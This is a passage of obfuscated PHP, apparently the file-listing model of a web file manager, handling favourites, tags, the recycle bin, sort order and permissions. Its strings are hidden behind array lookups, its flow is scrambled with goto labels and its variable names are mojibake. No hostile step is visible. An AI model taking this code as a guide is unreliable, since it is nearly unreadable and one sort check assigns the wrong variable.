$CôÊ…îˆ¡¬[391]; $EøâšÈìÅ .= $CôÊ…îˆ¡¬[392]; $EøâšÈìÅ .= $CôÊ…îˆ¡¬[393]; goto A¨êí›Ïéè; d£“ğòíÍÛ: $fù¥­¢Êó = array(); foreach ($aÏäÍ´¿Ö as $C Íø†ì) { if (in_array($C Íø†ì, $bù•ßå¶‚)) { continue; } $fù¥­¢Êó[] = $C Íø†ì; } goto D‘Å§Å¶æ; A¨êí›Ïéè: $Fäæ³†§’¯ = $CôÊ…îˆ¡¬[394]; $bù•ßå¶‚ = explode($CôÊ…îˆ¡¬[47], $Fäæ³†§’¯); $aÏäÍ´¿Ö = explode($CôÊ…îˆ¡¬[47], $EøâšÈìÅ); goto d£“ğòíÍÛ; D‘Å§Å¶æ: } $d¹ãìÂƒ±§[$CôÊ…îˆ¡¬[75]] = $CôÊ…îˆ¡¬[395] . $d¹ãìÂƒ±§[$CôÊ…îˆ¡¬[390]] . $CôÊ…îˆ¡¬[396]; $d¹ãìÂƒ±§[$CôÊ…îˆ¡¬[29]] = $d¹ãìÂƒ±§[$CôÊ…îˆ¡¬[397]] == 1 ? $CôÊ…îˆ¡¬[76] : $CôÊ…îˆ¡¬[191]; goto cÒïó“øŸ©; fƒÏô¾Ü‰²: $CôÊ…îˆ¡¬ =& $_SERVER[…ë˜õ]; static $aÏäÍ´¿Ö = false; static $fù¥­¢Êó = false; goto F¶«ÀÀù; F×ÚÕ‡‹µƒ: if (isset($d¹ãìÂƒ±§[$CôÊ…îˆ¡¬[400]]) && $d¹ãìÂƒ±§[$CôÊ…îˆ¡¬[400]][$CôÊ…îˆ¡¬[401]] == -1) { $dõùƒ ÷Èè = $fù¥­¢Êó; } $d¹ãìÂƒ±§ = array_field_key($d¹ãìÂƒ±§, $dõùƒ ÷Èè); return $d¹ãìÂƒ±§; goto aç· æ¾˜; cÒïó“øŸ©: $d¹ãìÂƒ±§[$CôÊ…îˆ¡¬[398]] = $this->typeName($d¹ãìÂƒ±§[$CôÊ…îˆ¡¬[398]]); if ($d¹ãìÂƒ±§[$CôÊ…îˆ¡¬[397]] != 1) { $d¹ãìÂƒ±§[$CôÊ…îˆ¡¬[167]] = $d¹ãìÂƒ±§[$CôÊ…îˆ¡¬[399]]; unset($d¹ãìÂƒ±§[$CôÊ…îˆ¡¬[399]]); } $dõùƒ ÷Èè = $aÏäÍ´¿Ö; goto F×ÚÕ‡‹µƒ; aç· æ¾˜: } public function listUserFav() { goto F”ò½÷š¡…; B®ôË°Ì¢…: foreach ($FóÍä¬İîï as &$d†ˆÇ¬‹Äé) { $d†ˆÇ¬‹Äé = array($bÌæä‹ì›[406] => $d†ˆÇ¬‹Äé[$bÌæä‹ì›[388]], $bÌæä‹ì›[407] => $d†ˆÇ¬‹Äé[$bÌæä‹ì›[28]], $bÌæä‹ì›[408] => $d†ˆÇ¬‹Äé[$bÌæä‹ì›[75]], $bÌæä‹ì›[409] => $d†ˆÇ¬‹Äé[$bÌæä‹ì›[29]], $bÌæä‹ì›[410] => $d†ˆÇ¬‹Äé[$bÌæä‹ì›[192]], $bÌæä‹ì›[411] => $d†ˆÇ¬‹Äé[$bÌæä‹ì›[83]]); if ($d†ˆÇ¬‹Äé[$bÌæä‹ì›[29]] == $bÌæä‹ì›[403] && $c±¯ÕÒÌ¨ñ[$d†ˆÇ¬‹Äé[$bÌæä‹ì›[75]]]) { $d†ˆÇ¬‹Äé[$bÌæä‹ì›[84]] = $c±¯ÕÒÌ¨ñ[$d†ˆÇ¬‹Äé[$bÌæä‹ì›[75]]]; } } unset($d†ˆÇ¬‹Äé); return $FóÍä¬İîï; goto AèÌ¥çÙ©; F”ò½÷š¡…: $bÌæä‹ì› =& $_SERVER[…ë˜õ]; $FóÍä¬İîï = Model($bÌæä‹ì›[402])->listData(); $f—Ûò®ÔŸ· = array_filter_by_field($FóÍä¬İîï, $bÌæä‹ì›[29], $bÌæä‹ì›[403]); goto c«ÏÆ©°ˆ; c«ÏÆ©°ˆ: $f—Ûò®ÔŸ· = array_to_keyvalue($f—Ûò®ÔŸ·, $bÌæä‹ì›[33], $bÌæä‹ì›[75]); if ($f—Ûò®ÔŸ·) { $c±¯ÕÒÌ¨ñ = $this->listSource(array($bÌæä‹ì›[404] => array($bÌæä‹ì›[405], $f—Ûò®ÔŸ·))); } $c±¯ÕÒÌ¨ñ = array_to_keyvalue($c±¯ÕÒÌ¨ñ[$bÌæä‹ì›[365]], $bÌæä‹ì›[390]); goto B®ôË°Ì¢…; AèÌ¥çÙ©: } public function listUserTag($bğ²ãÑêè) { goto Cßø ‰˜êØ; Cßø ‰˜êØ: $EôÍ×ÍĞœæ =& $_SERVER[…ë˜õ]; if ($bğ²ãÑêè && !is_array($bğ²ãÑêè)) { $bğ²ãÑêè = array($bğ²ãÑêè); } $A†‚Í×†‡Â = Model($EôÍ×ÍĞœæ[412])->listData(); goto cµ‡îœïÍ; E–ò¶ Õ‡†: if (!$FÜ¬ÀÍ· || count($CÙä›µÅĞ ) == $FÜ¬ÀÍ·[$EôÍ×ÍĞœæ[362]][$EôÍ×ÍĞœæ[363]]) { return $FÜ¬ÀÍ·; } $AáÜõÀÛ = array(); $eË˜ğùßÇ = array_to_keyvalue($FÜ¬ÀÍ·[$EôÍ×ÍĞœæ[74]], $EôÍ×ÍĞœæ[33], $EôÍ×ÍĞœæ[390]); goto Dç‚‰³×Ÿ; AòÆµ†šõ¸: if ($AáÜõÀÛ) { Model($EôÍ×ÍĞœæ[414])->removeBySource($AáÜõÀÛ); } return $FÜ¬ÀÍ·; goto bõÆ÷ÊôÕç; cµ‡îœïÍ: $Cíª†”„ÃÇ = array(); foreach ($A†‚Í×†‡Â as $e£Õ–¯Ä÷) { $D¬‡‰İ¸„Á = $e£Õ–¯Ä÷[$EôÍ×ÍĞœæ[75]]; if (!$D¬‡‰İ¸„Á) { continue; } if (!isset($Cíª†”„ÃÇ[$D¬‡‰İ¸„Á])) { $Cíª†”„ÃÇ[$D¬‡‰İ¸„Á] = array(); } $Cíª†”„ÃÇ[$D¬‡‰İ¸„Á][] = $e£Õ–¯Ä÷[$EôÍ×ÍĞœæ[413]]; } $CÙä›µÅĞ  = array(); goto e®„ÛŠ†‰; Dç‚‰³×Ÿ: $EòŞ„¾îƒ = array_to_keyvalue($FÜ¬ÀÍ·[$EôÍ×ÍĞœæ[73]], $EôÍ×ÍĞœæ[33], $EôÍ×ÍĞœæ[390]); $e˜å¨«¸²ë = array_merge($EòŞ„¾îƒ, $eË˜ğùßÇ); foreach ($CÙä›µÅĞ  as $D¬‡‰İ¸„Á) { if (!in_array($D¬‡‰İ¸„Á, $e˜å¨«¸²ë)) { $AáÜõÀÛ[] = $D¬‡‰İ¸„Á; } } goto AòÆµ†šõ¸; e®„ÛŠ†‰: foreach ($Cíª†”„ÃÇ as $aÜÂ®Ëˆèœ => $E êè½Ïº†) { $Cß‘µóÀÁ = !0; if (!$bğ²ãÑêè) { $CÙä›µÅĞ [] = $aÜÂ®Ëˆèœ; continue; } foreach ($bğ²ãÑêè as $aµî“ˆ¾) { if (!in_array($aµî“ˆ¾, $E êè½Ïº†)) { $Cß‘µóÀÁ = !1; break; } } if ($Cß‘µóÀÁ) { $CÙä›µÅĞ [] = $aÜÂ®Ëˆèœ; } } if (!$CÙä›µÅĞ ) { return array(); } $FÜ¬ÀÍ· = $this->listSource(array($EôÍ×ÍĞœæ[404] => array($EôÍ×ÍĞœæ[405], $CÙä›µÅĞ ))); goto E–ò¶ Õ‡†; bõÆ÷ÊôÕç: } public function listUserRecycle() { $e¿âßˆ‰Ñ =& $_SERVER[…ë˜õ]; $bÃñ˜µíß½ = Model($e¿âßˆ‰Ñ[415])->listData(); if (!$bÃñ˜µíß½) { return array(); } $C«©«¸ªğÑ = array($e¿âßˆ‰Ñ[404] => array($e¿âßˆ‰Ñ[405], $bÃñ˜µíß½), $e¿âßˆ‰Ñ[416] => 1); return $this->listSource($C«©«¸ªğÑ); } public function listSource($fó×ôÕãİ, $C„×ÚË¬¾ = 3000) { goto dæŒõÎÓµ‚; f’‹›ŒÁÀ: return $fàœÄãŞµñ; goto E—‹ŸŞÌ­õ; dæŒõÎÓµ‚: $C¿Õ×Ï’ÂÉ =& $_SERVER[…ë˜õ]; if (!isset($fó×ôÕãİ[$C¿Õ×Ï’ÂÉ[417]])) { $fó×ôÕãİ[$C¿Õ×Ï’ÂÉ[417]] = 0; } $bñø‡­Á©‘ = $C¿Õ×Ï’ÂÉ[418]; goto Dá¶–¬ºÒ´; Dá¶–¬ºÒ´: $fàœÄãŞµñ = $this->field($bñø‡­Á©‘)->_makeOrder()->where($fó×ôÕãİ)->selectPage($C„×ÚË¬¾); $this->_listDataApply($fàœÄãŞµñ[$C¿Õ×Ï’ÂÉ[365]]); $this->_listMake($fàœÄãŞµñ); goto f’‹›ŒÁÀ; E—‹ŸŞÌ­õ: } protected function _makeOrder() { goto c³ß”µˆïõ; c³ß”µˆïõ: $aâĞÄ˜÷ÂŞ =& $_SERVER[…ë˜õ]; $fà¦Íå¢Ñ§ = Model($aâĞÄ˜÷ÂŞ[419])->get($aâĞÄ˜÷ÂŞ[420]); $B¬–İ±›œä = Model($aâĞÄ˜÷ÂŞ[419])->get($aâĞÄ˜÷ÂŞ[421]); goto a‡ÄÉ¾´¦‚; f»„ßÌ´ó: if ($dâˆò¯ö == $aâĞÄ˜÷ÂŞ[28]) { } $b÷ï÷á¶œï = $aâĞÄ˜÷ÂŞ[431] . $e¾ïÏ¨¸ºù[$dâˆò¯ö] . $aâĞÄ˜÷ÂŞ[50] . $DËå‚Õ‘®Ë[$a³¢¯‰Ëòß]; return $this->order(rtrim(trim($b÷ï÷á¶œï), $aâĞÄ˜÷ÂŞ[47])); goto Díâ§Ã†µç; a‡ÄÉ¾´¦‚: $DËå‚Õ‘®Ë = array($aâĞÄ˜÷ÂŞ[422] => $aâĞÄ˜÷ÂŞ[423], $aâĞÄ˜÷ÂŞ[424] => $aâĞÄ˜÷ÂŞ[425]); $e¾ïÏ¨¸ºù = array($aâĞÄ˜÷ÂŞ[28] => $aâĞÄ˜÷ÂŞ[28], $aâĞÄ˜÷ÂŞ[77] => $aâĞÄ˜÷ÂŞ[77], $aâĞÄ˜÷ÂŞ[167] => $aâĞÄ˜÷ÂŞ[399], $aâĞÄ˜÷ÂŞ[426] => $aâĞÄ˜÷ÂŞ[426], $aâĞÄ˜÷ÂŞ[427] => $aâĞÄ˜÷ÂŞ[428], $aâĞÄ˜÷ÂŞ[192] => $aâĞÄ˜÷ÂŞ[192], $aâĞÄ˜÷ÂŞ[83] => $aâĞÄ˜÷ÂŞ[83]); $dâˆò¯ö = Input::get($aâĞÄ˜÷ÂŞ[429], $aâĞÄ˜÷ÂŞ[7], $fà¦Íå¢Ñ§, array_keys($e¾ïÏ¨¸ºù)); goto eò˜æ¤½†; eò˜æ¤½†: $a³¢¯‰Ëòß = Input::get($aâĞÄ˜÷ÂŞ[430], $aâĞÄ˜÷ÂŞ[7], $B¬–İ±›œä, array_keys($DËå‚Õ‘®Ë)); if (!in_array($dâˆò¯ö, array_keys($e¾ïÏ¨¸ºù))) { $dâˆò¯ö = $aâĞÄ˜÷ÂŞ[28]; } if (!in_array($a³¢¯‰Ëòß, array_keys($DËå‚Õ‘®Ë))) { $dâˆò¯ö = $aâĞÄ˜÷ÂŞ[422]; } goto f»„ßÌ´ó; Díâ§Ã†µç: } protected function _listDataApplyItem($cÍ¦ã¬Ì¾ä, $a®Ö»ÍÏÉÕ = false) { $d©×÷ĞÍÅÊ = array($cÍ¦ã¬Ì¾ä); $this->_listDataApply($d©×÷ĞÍÅÊ, $a®Ö»ÍÏÉÕ); return $d©×÷ĞÍÅÊ[0]; } protected function _listDataApply(&$c¶‘¦¥¯, $B¹à½¤ÜŒ‘ = false) { goto Dë‚ä–ßñ; Dë‚ä–ßñ: $c‰ Ÿ–´æ =& $_SERVER[…ë˜õ]; if (!$c¶‘¦¥¯) { $c¶‘¦¥¯ = array(); return; } $Føõ…²©ÚÒ = array_to_keyvalue($c¶‘¦¥¯, $c‰ Ÿ–´æ[33], $c‰ Ÿ–´æ[390]); goto A«ÛàĞ³âˆ; A«ÛàĞ³âˆ: $Føõ…²©ÚÒ = array_unique($Føõ…²©ÚÒ); $this->_listSourceCache($c¶‘¦¥¯); if (!$B¹à½¤ÜŒ‘) { $this->_listAppendMeta($c¶‘¦¥¯, $Føõ…²©ÚÒ); $this->_listAppendFileMeta($c¶‘¦¥¯, $Føõ…²©ÚÒ); $this->_listAppendChildren($c¶‘¦¥¯, $Føõ…²©ÚÒ); } goto D§²öª ; BÏùƒ»è±: $this->_listAppendUser($c¶‘¦¥¯); $this->_listFilterInfo($c¶‘¦¥¯, $B¹à½¤ÜŒ‘); goto fäªÕêÌÆœ; D§²öª : $this->_listAppendPath($c¶‘¦¥¯); $this->_listAppendAuth($c¶‘¦¥¯); $this->_listAppendSourceInfo($c¶‘¦¥¯, $Føõ…²©ÚÒ); goto BÏùƒ»è±; fäªÕêÌÆœ: } protected function _listSourceCache($C«×ÌôĞ•Ğ) { $FØÚ„Ó³”¨ =& $_SERVER[…ë˜õ]; foreach ($C«×ÌôĞ•Ğ as $fƒŸ–ö¡„®) { self::$cacheSourceInfo[$FØÚ„Ó³”¨[432] . $fƒŸ–ö¡„®[$FØÚ„Ó³”¨[390]]] = $fƒŸ–ö¡„®; } } protected function _listFilterInfo(&$EÕ£†™çõ, $Cìçœõñ®ò = false) { $E‘ôºïê¼œ =& $_SERVER[…ë˜õ]; foreach ($EÕ£†™çõ as &$fŸ»í®ê¾) { $fŸ»í®ê¾ = $this->pathInfoFilter($fŸ»í®ê¾); self::$cachePathInfo[$E‘ôºïê¼œ[433] . intval($Cìçœõñ®ò) . $E‘ôºïê¼œ[434] . $fŸ»í®ê¾[$E‘ôºïê¼œ[390]]] = $fŸ»í®ê¾; } unset($fŸ»í®ê¾); } protected function _listMake(&$EùÙ¿’Ìª‡) { $DâİëÎåã‡ =& $_SERVER[…ë˜õ]; $EùÙ¿’Ìª‡[$DâİëÎåã‡[74]] = array(); $EùÙ¿’Ìª‡[$DâİëÎåã‡[73]] = array(); foreach ($EùÙ¿’Ìª‡[$DâİëÎåã‡[365]] as $F®ß‰ĞàŠó) { $B¢ÅƒÎ÷—¤ = $F®ß‰ĞàŠó[$DâİëÎåã‡[397]] == 1 ? $DâİëÎåã‡[74] : $DâİëÎåã‡[73]; $EùÙ¿’Ìª‡[$B¢ÅƒÎ÷—¤][] = $F®ß‰ĞàŠó; } unset($EùÙ¿’Ìª‡[$DâİëÎåã‡[365]]); } protected function _listAppendMeta(&$D„Ô²‹ï‚‰, $d¦Ş†î…Ò) { goto AğÌ¬çÒ©Æ; B™¨Ë¢ŸØ‘: if (!$FŠÛÕİÃº) { return; } $AŸ³ïè¢‘Í = array($FĞ†¸‹®³»[437], $FĞ†¸‹®³»[438]); $C·˜œ’»… = array(); goto BâÒ‚µ©Ú‰; BâÒ‚µ©Ú‰: foreach ($FŠÛÕİÃº as $D•™‹ì°¸) { if (!isset($C·˜œ’»…[$D•™‹ì°¸[$FĞ†¸‹®³»[390]]])) { $C·˜œ’»…[$D•™‹ì°¸[$FĞ†¸‹®³»[390]]] = array(); } if (in_array($D•™‹ì°¸[$FĞ†¸‹®³»[92]], $AŸ³ïè¢‘Í)) { continue; } $C·˜œ’»…[$D•™‹ì°¸[$FĞ†¸‹®³»[390]]][$D•™‹ì°¸[$FĞ†¸‹®³»[92]]] = $D•™‹ì°¸[$FĞ†¸‹®³»[370]]; } foreach ($D„Ô²‹ï‚‰ as &$fª®³îÛ) { $fª®³îÛ[$FĞ†¸‹®³»[439]] = !1; if (isset($C·˜œ’»…[$fª®³îÛ[$FĞ†¸‹®³»[390]]])) { $fª®³îÛ[$FĞ†¸‹®³»[439]] = $C·˜œ’»…[$fª®³îÛ[$FĞ†¸‹®³»[390]]]; } if ($this->fileIsLock($fª®³îÛ) && $fª®³îÛ[$FĞ†¸‹®³»[400]]) { $D©óºÎåµ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $fª®³îÛ[$FĞ†¸‹®³»[400]][$FĞ†¸‹®³»[401]] = AuthModel::authDisable($fª®³îÛ[$FĞ†¸‹®³»[400]][$FĞ†¸‹®³»[401]], $D©óºÎåµ); $fª®³îÛ[$FĞ†¸‹®³»[400]][$FĞ†¸‹®³»[440]][$FĞ†¸‹®³»[400]] = $fª®³îÛ[$FĞ†¸‹®³»[400]][$FĞ†¸‹®³»[401]]; } } unset($fª®³îÛ); goto F±ƒ‚¥«; AğÌ¬çÒ©Æ: $FĞ†¸‹®³» =& $_SERVER[…ë˜õ]; $fÛÀç¹È´ = array($FĞ†¸‹®³»[404] => array($FĞ†¸‹®³»[405], $d¦Ş†î…Ò)); $FŠÛÕİÃº = Model($FĞ†¸‹®³»[435])->field($FĞ†¸‹®³»[436])->where($fÛÀç¹È´)->select(); goto B™¨Ë¢ŸØ‘; F±ƒ‚¥«: } protected function _listAppendFileMeta(&$BµËä Œ†, $dÒî›–êª¥) { goto F¢¢æÏİóç; Aãñ«”¼†Ö: foreach ($BµËä Œ† as &$eÏÏàÑåÜ±) { goto E„¶ñ”›¢; A±Ç‰õ‰Æ‚: unset($cÜïÉ«Íë[$DÌ£ˆÄ­®Ü][$Côœšˆ‘¬[75]]); $cğî©ŞÛ = is_array($eÌˆ‡ƒù‚‚[$DÌ£ˆÄ­®Ü]) ? $eÌˆ‡ƒù‚‚[$DÌ£ˆÄ­®Ü] : array(); $eÏÏàÑåÜ±[$Côœšˆ‘¬[163]] = array_merge($cğî©ŞÛ, $cÜïÉ«Íë[$DÌ£ˆÄ­®Ü]); goto aÅÒÉó“£„; E„¶ñ”›¢: $DÌ£ˆÄ­®Ü = $eÏÏàÑåÜ±[$Côœšˆ‘¬[441]]; if (!$DÌ£ˆÄ­®Ü || !is_array($cÜïÉ«Íë[$DÌ£ˆÄ­®Ü])) { continue; } $b®ÂàˆŸ = $cÜïÉ«Íë[$DÌ£ˆÄ­®Ü]; goto B£Ë£ÆĞ‘å; aÅÒÉó“£„: if (isset($eÏÏàÑåÜ±[$Côœšˆ‘¬[163]][$Côœšˆ‘¬[162]])) { $eÏÏàÑåÜ±[$Côœšˆ‘¬[162]] = json_decode($eÏÏàÑåÜ±[$Côœšˆ‘¬[163]][$Côœšˆ‘¬[162]], !0); unset($eÏÏàÑåÜ±[$Côœšˆ‘¬[163]][$Côœšˆ‘¬[162]]); } goto Eê…™ÆµŞğ; B£Ë£ÆĞ‘å: $b®ÂàˆŸ[$Côœšˆ‘¬[77]] = $eÏÏàÑåÜ±[$Côœšˆ‘¬[77]]; $b®ÂàˆŸ[$Côœšˆ‘¬[28]] = $eÏÏàÑåÜ±[$Côœšˆ‘¬[28]]; if (!isset(self::$cacheFileInfo[$Côœšˆ‘¬[447] . $DÌ£ˆÄ­®Ü])) { self::$cacheFileInfo[$Côœšˆ‘¬[447] . $DÌ£ˆÄ­®Ü] = array_merge(array(), $b®ÂàˆŸ); } goto A±Ç‰õ‰Æ‚; Eê…™ÆµŞğ: } unset($eÏÏàÑåÜ±); goto eõÙØ‹Ì•ç; F¢¢æÏİóç: $Côœšˆ‘¬ =& $_SERVER[…ë˜õ]; $eÙ¨’†‰Î½ = array_to_keyvalue($BµËä Œ†, $Côœšˆ‘¬[33], $Côœšˆ‘¬[441]); $eÙ¨’†‰Î½ = array_filter(array_unique($eÙ¨’†‰Î½)); goto bŠİéÚôµ; bŠİéÚôµ: if (!$eÙ¨’†‰Î½) { return; } $d‹èÄøÔŞì = array($Côœšˆ‘¬[442] => array($Côœšˆ‘¬[405], $eÙ¨’†‰Î½)); $d³äªÚ‹ğ = $Côœšˆ‘¬[443]; goto d‰Ú¹œ; b¨ë÷†Ø´¸: $dØæƒğ÷º = $dØæƒğ÷º ? $dØæƒğ÷º : array(); $eÌˆ‡ƒù‚‚ = array(); foreach ($dØæƒğ÷º as $DÀóéÉ›ÉĞ) { if (!isset($eÌˆ‡ƒù‚‚[$DÀóéÉ›ÉĞ[$Côœšˆ‘¬[441]]])) { $eÌˆ‡ƒù‚‚[$DÀóéÉ›ÉĞ[$Côœšˆ‘¬[441]]] = array(); } $eÌˆ‡ƒù‚‚[$DÀóéÉ›ÉĞ[$Côœšˆ‘¬[441]]][$DÀóéÉ›ÉĞ[$Côœšˆ‘¬[92]]] = $DÀóéÉ›ÉĞ[$Côœšˆ‘¬[370]]; } goto Aãñ«”¼†Ö; d‰Ú¹œ: $cÜïÉ«Íë = Model($Côœšˆ‘¬[444])->field($d³äªÚ‹ğ)->where($d‹èÄøÔŞì)->select(); $cÜïÉ«Íë = array_to_keyvalue($cÜïÉ«Íë, $Côœšˆ‘¬[441]); $dØæƒğ÷º = Model($Côœšˆ‘¬[445])->field($Côœšˆ‘¬[446])->where($d‹èÄøÔŞì)->select(); goto b¨ë÷†Ø´¸; eõÙØ‹Ì•ç: } protected function _listAppendSourceInfo(&$fâˆœô¾¶ğ, $cÕÕåŒîâ) { goto c†õóŠê×¡; F¥ßÇ‰÷‡š: $fßĞ¸ï‚á¾ = array_to_keyvalue_group($D¥Õã‘™Ù¹, $fåÑİ§‡İ[390]); foreach ($fâˆœô¾¶ğ as &$eÌ‹ˆŸ‘Ü‡) { $eÌ‹ˆŸ‘Ü‡[$fåÑİ§‡İ[84]] = array($fåÑİ§‡İ[451] => 0, $fåÑİ§‡İ[452] => 0, $fåÑİ§‡İ[453] => 0); if (isset($Cµ×Û°Ú[$eÌ‹ˆŸ‘Ü‡[$fåÑİ§‡İ[390]]])) { $eÌ‹ˆŸ‘Ü‡[$fåÑİ§‡İ[84]][$fåÑİ§‡İ[454]] = 1; $eÌ‹ˆŸ‘Ü‡[$fåÑİ§‡İ[84]][$fåÑİ§‡İ[455]] = $Cµ×Û°Ú[$eÌ‹ˆŸ‘Ü‡[$fåÑİ§‡İ[390]]][$fåÑİ§‡İ[28]]; } if (isset($f«äæÕˆ»[$eÌ‹ˆŸ‘Ü‡[$fåÑİ§‡İ[390]]])) { $eÌ‹ˆŸ‘Ü‡[$fåÑİ§‡İ[84]][$fåÑİ§‡İ[456]] = array(); foreach ($f«äæÕˆ»[$eÌ‹ˆŸ‘Ü‡[$fåÑİ§‡İ[390]]] as $A¨§¬ØÂ˜) { $aºã¢õ¢×— = $BÂ¼îØÕÛ¤[$A¨§¬ØÂ˜]; $eÌ‹ˆŸ‘Ü‡[$fåÑİ§‡İ[84]][$fåÑİ§‡İ[456]][] = array($fåÑİ§‡İ[457] => $aºã¢õ¢×—[$fåÑİ§‡İ[388]], $fåÑİ§‡İ[407] => $aºã¢õ¢×—[$fåÑİ§‡İ[28]], $fåÑİ§‡İ[458] => $aºã¢õ¢×—[$fåÑİ§‡İ[459]]); } } if (isset($fßĞ¸ï‚á¾[$eÌ‹ˆŸ‘Ü‡[$fåÑİ§‡İ[390]]])) { $eÌ‹ˆŸ‘Ü‡[$fåÑİ§‡İ[84]][$fåÑİ§‡İ[460]] = array(); foreach ($fßĞ¸ï‚á¾[$eÌ‹ˆŸ‘Ü‡[$fåÑİ§‡İ[390]]] as $b³»±Õ†´) { $eÌ‹ˆŸ‘Ü‡[$fåÑİ§‡İ[84]][$fåÑİ§‡İ[460]] = array($fåÑİ§‡İ[461] => $b³»±Õ†´[$fåÑİ§‡İ[462]], $fåÑİ§‡İ[463] => $b³»±Õ†´[$fåÑİ§‡İ[464]], $fåÑİ§‡İ[465] => $b³»±Õ†´[$fåÑİ§‡İ[390]], $fåÑİ§‡İ[466] => $b³»±Õ†´[$fåÑİ§‡İ[467]], $fåÑİ§‡İ[468] => $b³»±Õ†´[$fåÑİ§‡İ[469]], $fåÑİ§‡İ[470] => $b³»±Õ†´[$fåÑİ§‡İ[470]], $fåÑİ§‡İ[471] => $b³»±Õ†´[$fåÑİ§‡İ[471]]); } } } unset($eÌ‹ˆŸ‘Ü‡); goto eÉæ¨Ûñˆ; c†õóŠê×¡: $fåÑİ§‡İ =& $_SERVER[…ë˜õ]; if (!defined($fåÑİ§‡İ[448])) { return; } $f•êæÕà¢İ = Model($fåÑİ§‡İ[449])->listData(); goto F‡˜‹ŸÙ»±; F‡˜‹ŸÙ»±: $e‡¦Š¡£‡÷ = Model($fåÑİ§‡İ[412])->listData(); $bƒ™õ»Ÿç = Model($fåÑİ§‡İ[402])->listData(); $D¥Õã‘™Ù¹ = Model($fåÑİ§‡İ[450])->listSimple(); goto D¸’ÜĞˆõà; eÉæ¨Ûñˆ: return $fâˆœô¾¶ğ; goto C‘¡À²¤†ù; D¸’ÜĞˆõà: $BÂ¼îØÕÛ¤ = array_to_keyvalue($f•êæÕà¢İ, $fåÑİ§‡İ[388]); $f«äæÕˆ» = array_to_keyvalue_group($e‡¦Š¡£‡÷, $fåÑİ§‡İ[75], $fåÑİ§‡İ[413]); $Cµ×Û°Ú = array_to_keyvalue($bƒ™õ»Ÿç, $fåÑİ§‡İ[75]); goto F¥ßÇ‰÷‡š; C‘¡À²¤†ù: } protected function _listAppendChildren(&$Dç„à°±‚™, $DùìƒÒ¾ø¶) { goto E™ğÔÉí´; E‚øªÊĞˆŸ: $E®ĞìäŒ´ = array($f¡®ïùçèì[472] => array($f¡®ïùçèì[7], $AˆŞøõ×£¬)); $bÄ…×ôó‘Ù = array($f¡®ïùçèì[472], $f¡®ïùçèì[397], $f¡®ïùçèì[473] => $f¡®ïùçèì[474]); $aéˆ‡ìéè· = $this->field($bÄ…×ôó‘Ù)->where($E®ĞìäŒ´)->group($f¡®ïùçèì[475])->select(); goto a‘ŒÚ´äœ; bøÁ§šŒç: unset($b¹¡¡„µ‹—); goto Aë—ÈÃ¡; a‘ŒÚ´äœ: $Bëµ–‘Áºå = array(); foreach ($aéˆ‡ìéè· as $dßç«¯Õ´„) { $CÍÕ¡‡”¥ğ = $dßç«¯Õ´„[$f¡®ïùçèì[472]]; $BÒŒİó¢Ø© = $dßç«¯Õ´„[$f¡®ïùçèì[397]] == $f¡®ïùçèì[86] ? $f¡®ïùçèì[202] : $f¡®ïùçèì[201]; if (!isset($Bëµ–‘Áºå[$CÍÕ¡‡”¥ğ])) { $Bëµ–‘Áºå[$CÍÕ¡‡”¥ğ] = array($f¡®ïùçèì[201] => 0, $f¡®ïùçèì[202] => 0); } $Bëµ–‘Áºå[$CÍÕ¡‡”¥ğ][$BÒŒİó¢Ø©] += $dßç«¯Õ´„[$f¡®ïùçèì[474]]; } foreach ($Dç„à°±‚™ as &$b¹¡¡„µ‹—) { if (!$b¹¡¡„µ‹—[$f¡®ïùçèì[397]]) { continue; } $c¨¿ù¥‡Ô† = is_array($Bëµ–‘Áºå[$b¹¡¡„µ‹—[$f¡®ïùçèì[390]]]) ? $Bëµ–‘Áºå[$b¹¡¡„µ‹—[$f¡®ïùçèì[390]]] : $dêÒ•‘‚›Å; $b¹¡¡„µ‹—[$f¡®ïùçèì[202]] = $c¨¿ù¥‡Ô†[$f¡®ïùçèì[202]]; $b¹¡¡„µ‹—[$f¡®ïùçèì[201]] = $c¨¿ù¥‡Ô†[$f¡®ïùçèì[201]]; unset($b¹¡¡„µ‹—[$f¡®ïùçèì[399]]); } goto bøÁ§šŒç; A–ÙÀíÀÇÍ: foreach ($Dç„à°±‚™ as &$b¹¡¡„µ‹—) { if (!$b¹¡¡„µ‹—[$f¡®ïùçèì[397]]) { continue; } $AˆŞøõ×£¬[] = $b¹¡¡„µ‹—[$f¡®ïùçèì[390]]; } unset($b¹¡¡„µ‹—); if (!$AˆŞøõ×£¬) { return; } goto E‚øªÊĞˆŸ; E™ğÔÉí´: $f¡®ïùçèì =& $_SERVER[…ë˜õ]; $AˆŞøõ×£¬ = array(); $dêÒ•‘‚›Å = array($f¡®ïùçèì[201] => 0, $f¡®ïùçèì[202] => 0); goto A–ÙÀíÀÇÍ; Aë—ÈÃ¡: } protected function _listAppendAuth(&$AÄÊÁ§Ñ) { goto e”ôª¼Å¢Ù; aÉ‚¶Í…çà: foreach ($AÄÊÁ§Ñ as $F™Çƒ¾…«ö) { if ($F™Çƒ¾…«ö[$dé…­ëİŒ[398]] == self::TYPE_GROUP) { $dÎª¼½òİ¥[] = $F™Çƒ¾…«ö[$dé…­ëİŒ[390]]; } } if (!$dÎª¼½òİ¥) { return; } $c”é¢¸ŠÔÕ = array_to_keyvalue($AÄÊÁ§Ñ, $dé…­ëİŒ[390]); goto A“ô“¿ÅŞ‚; A“ô“¿ÅŞ‚: $aÛÓïª‘‡ = Model($dé…­ëİŒ[476])->getSourceList($dÎª¼½òİ¥, $c”é¢¸ŠÔÕ); foreach ($AÄÊÁ§Ñ as $aÛ­‰£î¢ => &$F™Çƒ¾…«ö) { $F™Çƒ¾…«ö[$dé…­ëİŒ[400]] = $aÛÓïª‘‡[$F™Çƒ¾…«ö[$dé…­ëİŒ[390]]]; if (!$F™Çƒ¾…«ö[$dé…­ëİŒ[400]] && $F™Çƒ¾…«ö[$dé…­ëİŒ[398]] == self::TYPE_GROUP) { $F™Çƒ¾…«ö[$dé…­ëİŒ[400]] = Action($dé…­ëİŒ[477])->pathGroupAuthMake($F™Çƒ¾…«ö[$dé…­ëİŒ[478]]); if (!$F™Çƒ¾…«ö[$dé…­ëİŒ[400]] && !_get($GLOBALS, $dé…­ëİŒ[479])) { $F™Çƒ¾…«ö[$dé…­ëİŒ[194]] = !1; $F™Çƒ¾…«ö[$dé…­ëİŒ[193]] = !1; } } if ($F™Çƒ¾…«ö[$dé…­ëİŒ[400]]) { $F™Çƒ¾…«ö[$dé…­ëİŒ[194]] = AuthModel::authCheckEdit($F™Çƒ¾…«ö[$dé…­ëİŒ[400]][$dé…­ëİŒ[401]]); 